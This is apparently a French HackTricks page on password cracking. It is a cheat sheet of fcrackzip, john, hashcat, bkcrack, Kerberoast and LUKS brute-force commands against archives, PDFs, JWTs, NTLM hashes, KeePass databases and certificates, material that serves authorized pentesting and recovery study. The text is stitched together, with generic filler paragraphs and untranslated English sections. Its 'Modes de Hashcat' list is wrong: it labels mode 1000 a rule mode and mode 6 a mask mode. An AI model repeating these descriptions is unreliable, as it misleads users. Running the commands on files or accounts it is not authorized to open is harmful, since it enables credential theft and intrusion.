Vérifiez cela avant d'essayer de forcer un hash.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Attaque par force brute avec texte en clair connu

Vous devez connaître le **texte en clair** (ou une partie du texte en clair) **d'un fichier contenu à l'intérieur** du fichier zip chiffré. Vous pouvez vérifier les **noms de fichiers et la taille des fichiers contenus à l'intérieur** d'un fichier zip chiffré en exécutant la commande suivante : **`7z l encrypted.zip`**\
Téléchargez [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) depuis la page des versions publiées.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

Le format de fichier 7z est un format d'archivage populaire qui utilise l'algorithme de compression LZMA pour réduire la taille des fichiers. Il est couramment utilisé pour compresser et décompresser des fichiers sur différentes plates-formes. Cependant, il est possible d'utiliser des techniques de force brute pour tenter de deviner le mot de passe d'un fichier 7z protégé par mot de passe.

La méthode de force brute consiste à essayer toutes les combinaisons possibles de mots de passe jusqu'à ce que le mot de passe correct soit trouvé. Cela peut être un processus long et intensif en termes de ressources, car il nécessite de tester un grand nombre de combinaisons.

Il existe plusieurs outils disponibles qui peuvent être utilisés pour effectuer une attaque de force brute sur un fichier 7z. Certains de ces outils sont spécifiquement conçus pour cela, tandis que d'autres sont des outils de piratage plus généraux qui peuvent également être utilisés pour cette tâche.

Lors de l'utilisation d'une attaque de force brute sur un fichier 7z, il est important de prendre en compte la complexité du mot de passe. Les mots de passe plus longs et plus complexes seront plus difficiles à deviner, tandis que les mots de passe courts et simples peuvent être devinés plus rapidement.

Il est également important de noter que l'utilisation de techniques de force brute pour accéder à des fichiers 7z protégés par mot de passe est une activité illégale, sauf si vous avez l'autorisation explicite du propriétaire du fichier. Il est donc essentiel de respecter les lois et réglementations en vigueur dans votre pays avant d'entreprendre de telles activités.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
# Brute Force

La méthode de force brute est une technique couramment utilisée en piratage informatique pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Cette méthode est souvent utilisée lorsque d'autres méthodes, telles que l'ingénierie sociale ou l'exploitation de vulnérabilités, ont échoué.

La force brute peut être utilisée pour attaquer différents types de systèmes, tels que les comptes en ligne, les réseaux sans fil, les fichiers chiffrés, etc. Elle est particulièrement efficace lorsque les mots de passe sont faibles ou prévisibles.

Il existe plusieurs outils disponibles pour effectuer des attaques par force brute, tels que Hydra, Medusa et John the Ripper. Ces outils automatisent le processus en essayant différentes combinaisons de mots de passe à une vitesse élevée.

Cependant, il convient de noter que la méthode de force brute peut être très lente et nécessite souvent beaucoup de temps et de ressources pour réussir. De plus, elle peut être détectée par des systèmes de sécurité qui bloquent les tentatives répétées de connexion.

Il est important de noter que l'utilisation de la méthode de force brute pour accéder à des systèmes ou des comptes sans autorisation est illégale et peut entraîner des poursuites judiciaires. La force brute doit être utilisée uniquement à des fins légales, telles que les tests de pénétration autorisés ou la récupération de mots de passe oubliés.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Mot de passe du propriétaire PDF

Pour craquer un mot de passe du propriétaire PDF, consultez ceci : [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Crackage NTLM

La méthode de craquage NTLM est une technique utilisée pour déchiffrer les mots de passe chiffrés en utilisant le protocole NTLM (NT LAN Manager). Le protocole NTLM est utilisé par les systèmes d'exploitation Windows pour stocker les mots de passe des utilisateurs.

Le craquage NTLM consiste à essayer différentes combinaisons de mots de passe jusqu'à ce que le mot de passe correct soit trouvé. Cette méthode est souvent utilisée lorsque les mots de passe sont stockés de manière non sécurisée ou lorsque les politiques de mot de passe sont faibles.

Il existe plusieurs outils et techniques disponibles pour effectuer le craquage NTLM, notamment l'utilisation de dictionnaires de mots de passe, de tables arc-en-ciel et de méthodes de force brute. Les dictionnaires de mots de passe contiennent une liste de mots couramment utilisés, tandis que les tables arc-en-ciel sont des bases de données précalculées contenant des valeurs de hachage de mots de passe.

La méthode de force brute consiste à essayer toutes les combinaisons possibles de caractères jusqu'à ce que le mot de passe correct soit trouvé. Cependant, cette méthode peut être très lente et nécessite beaucoup de ressources informatiques.

Il est important de noter que le craquage NTLM est une activité illégale sans autorisation appropriée. Il est essentiel de respecter les lois et les réglementations en vigueur lors de l'utilisation de ces techniques.
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
# Keepass

Keepass est un gestionnaire de mots de passe open source qui permet de stocker en toute sécurité vos mots de passe et autres informations sensibles. Il utilise un algorithme de chiffrement fort pour protéger vos données et nécessite un mot de passe principal pour accéder à votre base de données.

L'une des méthodes couramment utilisées pour pirater un fichier Keepass est l'attaque par force brute. Cette technique consiste à essayer toutes les combinaisons possibles de mots de passe jusqu'à ce que le bon soit trouvé.

Il existe plusieurs outils disponibles pour effectuer une attaque par force brute sur un fichier Keepass. Certains de ces outils sont spécifiquement conçus pour cela, tandis que d'autres sont des outils de piratage plus généraux qui peuvent également être utilisés pour cette tâche.

L'attaque par force brute peut être une méthode efficace pour pirater un fichier Keepass si le mot de passe principal est faible ou facile à deviner. Cependant, cette méthode peut prendre beaucoup de temps, en particulier si le mot de passe est long et complexe.

Il est important de noter que l'attaque par force brute est une activité illégale et non éthique, sauf si elle est effectuée dans le cadre d'un test de pénétration autorisé. Il est donc essentiel de toujours obtenir une autorisation écrite avant de procéder à une attaque par force brute sur un fichier Keepass ou tout autre système.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Le keberoasting est une technique d'attaque utilisée pour récupérer les mots de passe faibles des comptes d'utilisateurs dans un environnement Active Directory. Cette méthode exploite une vulnérabilité dans le chiffrement des mots de passe Kerberos.

L'attaque commence par l'identification des comptes d'utilisateurs qui utilisent des méthodes de chiffrement Kerberos faibles, telles que RC4. Ensuite, l'attaquant extrait les informations de hachage des mots de passe de ces comptes à partir du trafic réseau ou de la base de données Active Directory.

Une fois que l'attaquant a obtenu les informations de hachage des mots de passe, il peut utiliser des outils de cracking de mots de passe pour tenter de deviner les mots de passe originaux. Les attaquants utilisent souvent des dictionnaires de mots de passe couramment utilisés ou des techniques de force brute pour accélérer le processus de craquage.

Il est important de noter que le keberoasting ne nécessite pas d'accès administratif au système cible. Les attaquants peuvent exécuter cette attaque à partir d'un compte utilisateur standard, ce qui rend cette technique particulièrement dangereuse.

Pour se protéger contre le keberoasting, il est recommandé d'utiliser des méthodes de chiffrement Kerberos plus solides, telles que AES, et de désactiver les méthodes de chiffrement faibles telles que RC4. De plus, la mise en place de politiques de mots de passe solides et l'utilisation de mots de passe complexes peuvent également aider à prévenir cette attaque.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Image Lucks

#### Méthode 1

Installer: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Méthode 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Un autre tutoriel sur le BF Luks : [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Clé privée PGP/GPG

A PGP/GPG private key is a crucial component of asymmetric encryption. It is used to decrypt messages that have been encrypted with the corresponding public key. The private key must be kept secret and secure, as it grants access to sensitive information.

Brute-forcing a PGP/GPG private key involves systematically trying all possible combinations until the correct key is found. This method is time-consuming and resource-intensive, as the number of possible combinations is extremely large.

To perform a brute-force attack on a PGP/GPG private key, various tools and resources can be utilized. These include specialized software, such as John the Ripper and Hashcat, which are capable of running exhaustive searches to crack the key.

It is important to note that brute-forcing a PGP/GPG private key is a highly complex and challenging task. It requires significant computational power and time, making it impractical in most scenarios. Additionally, attempting to brute-force a private key without proper authorization is illegal and unethical.

To protect against brute-force attacks, it is essential to use strong and unique passphrases for PGP/GPG private keys. Additionally, implementing multi-factor authentication and regularly updating encryption algorithms can further enhance security.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### Clé maître DPAPI

Utilisez [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) puis john

### Colonne protégée par mot de passe dans Open Office

Si vous avez un fichier xlsx avec une colonne protégée par un mot de passe, vous pouvez la déprotéger :

* **Téléchargez-le sur Google Drive** et le mot de passe sera automatiquement supprimé
* Pour le **supprimer** manuellement :
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Certificats PFX

PFX (Personal Information Exchange) est un format de fichier utilisé pour stocker et transporter des certificats numériques, des clés privées et des chaînes de certificats. Les certificats PFX sont couramment utilisés dans les environnements Windows pour sécuriser les communications et les transactions en ligne.

Les certificats PFX peuvent être protégés par un mot de passe, ce qui ajoute une couche de sécurité supplémentaire. Lorsqu'un certificat PFX est utilisé, le mot de passe doit être fourni pour accéder à la clé privée et aux informations du certificat.

Les certificats PFX peuvent être générés à l'aide d'outils de génération de certificats, tels que OpenSSL. Une fois générés, ils peuvent être utilisés pour sécuriser les connexions SSL/TLS, les signatures numériques et d'autres opérations cryptographiques.

Lors de l'utilisation de certificats PFX, il est important de prendre des mesures de sécurité appropriées pour protéger le fichier et le mot de passe associé. Cela inclut le stockage sécurisé du fichier, la limitation de l'accès aux personnes autorisées et la rotation régulière des certificats pour éviter les compromissions potentielles.

En résumé, les certificats PFX sont un moyen courant de sécuriser les communications et les transactions en ligne dans les environnements Windows. Ils offrent une protection supplémentaire en utilisant un mot de passe pour accéder à la clé privée et aux informations du certificat.
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.io/) pour construire facilement et **automatiser des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Outils

**Exemples de hachages :** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Identificateur de hachage
```bash
hash-identifier
> <HASH>
```
### Listes de mots

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Outils de génération de listes de mots**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Générateur avancé de combinaisons de touches avec des caractères de base, une disposition de touches et des itinéraires configurables.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Mutation de John

Lisez _**/etc/john/john.conf**_ et configurez-le.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Attaques Hashcat

* **Attaque par liste de mots** (`-a 0`) avec des règles

**Hashcat** est déjà livré avec un **dossier contenant des règles**, mais vous pouvez trouver [**d'autres règles intéressantes ici**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Attaque de combinaison de listes de mots**

Il est possible de **combiner 2 listes de mots en une seule** avec hashcat.\
Si la liste 1 contenait le mot **"hello"** et que la deuxième contenait 2 lignes avec les mots **"world"** et **"earth"**. Les mots `helloworld` et `helloearth` seront générés.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Attaque par masque** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Attaque par liste de mots + masque (`-a 6`) / Attaque par masque + liste de mots (`-a 7`)
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Modes de Hashcat

Hashcat est un outil de craquage de mots de passe qui prend en charge différents modes pour attaquer les hachages de mots de passe. Chaque mode est conçu pour cibler un type spécifique de hachage et utilise des techniques de craquage adaptées à ce type.

Voici quelques-uns des modes les plus couramment utilisés dans Hashcat :

- **Mode de dictionnaire (0)** : Ce mode utilise un fichier de dictionnaire contenant une liste de mots pour essayer de deviner le mot de passe. Il est efficace lorsque le mot de passe est basé sur un mot courant ou une phrase.

- **Mode de force brute (3)** : Ce mode essaie toutes les combinaisons possibles de caractères pour trouver le mot de passe. Il est extrêmement puissant mais peut prendre beaucoup de temps, en particulier pour les mots de passe longs et complexes.

- **Mode de masque (6)** : Ce mode utilise un masque personnalisé pour générer toutes les combinaisons possibles de caractères. Il est utile lorsque vous connaissez certaines parties du mot de passe, comme sa longueur ou les caractères qu'il contient.

- **Mode hybride (7)** : Ce mode combine le mode de dictionnaire et le mode de force brute pour augmenter les chances de succès. Il utilise d'abord le dictionnaire, puis passe en mode de force brute pour les mots de passe qui n'ont pas été trouvés.

- **Mode règle (1000)** : Ce mode applique des règles spécifiques aux mots du dictionnaire pour générer des variantes et augmenter les chances de trouver le mot de passe. Les règles peuvent inclure des modifications telles que l'ajout de chiffres ou de symboles à la fin du mot.

Ces modes, combinés à d'autres fonctionnalités de Hashcat, offrent une grande flexibilité pour attaquer différents types de hachages de mots de passe. Il est important de choisir le mode approprié en fonction de la situation et des informations disponibles.
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Cracking Linux Hashes - Fichier /etc/shadow

## Introduction

Le fichier `/etc/shadow` est un fichier système utilisé par les systèmes d'exploitation Linux pour stocker les mots de passe des utilisateurs. Ce fichier est essentiellement utilisé pour sécuriser les mots de passe en les stockant sous forme de hachages plutôt que de les stocker en texte brut.

## Méthodologie de force brute

La méthode de force brute est une technique couramment utilisée pour craquer les hachages de mots de passe. Elle consiste à essayer toutes les combinaisons possibles de caractères jusqu'à ce que le hachage correspondant soit trouvé.

Voici les étapes générales pour effectuer une attaque de force brute sur les hachages Linux :

1. Récupérer le fichier `/etc/shadow` contenant les hachages des mots de passe.
2. Extraire les hachages des mots de passe du fichier.
3. Générer une liste de mots de passe potentiels à partir d'un dictionnaire ou en utilisant des règles de génération de mots de passe.
4. Appliquer chaque mot de passe potentiel à une fonction de hachage et comparer le résultat avec les hachages extraits.
5. Si un hachage correspondant est trouvé, le mot de passe correspondant a été craqué avec succès.

## Ressources supplémentaires

Il existe plusieurs outils et ressources disponibles pour faciliter le processus de craquage des hachages Linux. Certains des outils populaires incluent :

- **John the Ripper** : Un puissant outil de craquage de mots de passe qui prend en charge plusieurs types de hachages, y compris les hachages Linux.
- **Hashcat** : Un autre outil de craquage de mots de passe qui prend en charge une large gamme de hachages, y compris les hachages Linux.
- **RainbowCrack** : Un outil basé sur des tables arc-en-ciel qui peut accélérer le processus de craquage des hachages.

Il est également recommandé d'utiliser des dictionnaires de mots de passe populaires et des règles de génération de mots de passe pour augmenter les chances de succès lors d'une attaque de force brute.

## Conclusion

Le craquage des hachages Linux est une tâche complexe mais réalisable en utilisant des techniques de force brute. Il est important de noter que le craquage des mots de passe sans autorisation appropriée est illégal et peut entraîner des conséquences juridiques. Il est donc essentiel de toujours agir dans le cadre de la loi et d'obtenir les autorisations nécessaires avant de procéder à des tests de pénétration.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Brute Force

Brute force is a common method used to crack Windows hashes. It involves systematically trying every possible combination of characters until the correct password is found.

## Tools

There are several tools available for brute forcing Windows hashes, including:

- **John the Ripper**: A popular password cracking tool that supports various hash types, including Windows LM and NTLM hashes.
- **Hashcat**: A powerful password recovery tool that can handle a wide range of hash types, including Windows hashes.
- **Cain and Abel**: A versatile tool that can be used for various password cracking techniques, including brute forcing Windows hashes.

## Methodology

The following steps outline a typical brute force attack on Windows hashes:

1. **Obtain the Hash**: Obtain the Windows hash that you want to crack. This can be done by extracting the hash from the Windows SAM file or by using tools like Mimikatz to dump the hashes from memory.

2. **Choose a Tool**: Select a suitable tool for brute forcing Windows hashes. Consider factors such as hash type support, performance, and ease of use.

3. **Configure the Tool**: Configure the selected tool with the necessary parameters, such as the hash type and the character set to use for the brute force attack.

4. **Start the Attack**: Start the brute force attack and let the tool systematically try different combinations of characters until the correct password is found.

5. **Monitor Progress**: Monitor the progress of the brute force attack. Depending on the complexity of the password and the computing power available, the attack may take a significant amount of time.

6. **Analyze Results**: Once the attack is complete, analyze the results to determine if the password was successfully cracked. If the password is found, it can be used to gain unauthorized access to the target system.

## Tips and Best Practices

- Use a strong and diverse character set for the brute force attack. This includes lowercase and uppercase letters, numbers, and special characters.
- Prioritize shorter password lengths, as they are generally easier to crack than longer ones.
- Utilize wordlists and dictionaries to increase the chances of success. These lists contain commonly used passwords and can significantly speed up the cracking process.
- Consider using a distributed computing approach, such as utilizing cloud/SaaS platforms, to leverage more computing power and speed up the brute force attack.

Remember that brute forcing Windows hashes is a time-consuming process and success is not guaranteed. It is important to consider legal and ethical implications before attempting any brute force attacks.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Brute Force

## Introduction

Brute force is a common method used to crack application hashes. It involves systematically trying all possible combinations of characters until the correct password is found. This technique can be effective, but it can also be time-consuming and resource-intensive.

## Methodology

1. **Identify the Hash Algorithm**: Determine the hash algorithm used by the application. Common algorithms include MD5, SHA-1, and SHA-256.

2. **Create a Wordlist**: Generate a wordlist containing potential passwords. This can be done by using common password dictionaries or by creating custom wordlists based on the target's characteristics.

3. **Choose a Brute Force Tool**: Select a brute force tool that supports the hash algorithm used by the application. Popular tools include Hashcat, John the Ripper, and Hydra.

4. **Configure the Brute Force Tool**: Set up the brute force tool to use the selected hash algorithm and provide it with the wordlist.

5. **Start the Brute Force Attack**: Launch the brute force attack and let the tool systematically try all possible password combinations. Monitor the progress and wait for the correct password to be found.

6. **Optimize the Attack**: If the initial brute force attack is unsuccessful, consider optimizing the attack by adjusting the character set, password length, or using additional techniques such as rule-based attacks.

7. **Analyze the Results**: Once the attack is complete, analyze the results to identify any cracked passwords. These passwords can then be used to gain unauthorized access to the application.

## Resources

- [Hashcat](https://hashcat.net/hashcat/)
- [John the Ripper](https://www.openwall.com/john/)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)

## Conclusion

Brute force attacks can be a powerful method for cracking application hashes. However, they require time, computational resources, and a good understanding of the target's characteristics. It is important to use this technique responsibly and only with proper authorization.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.io/) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
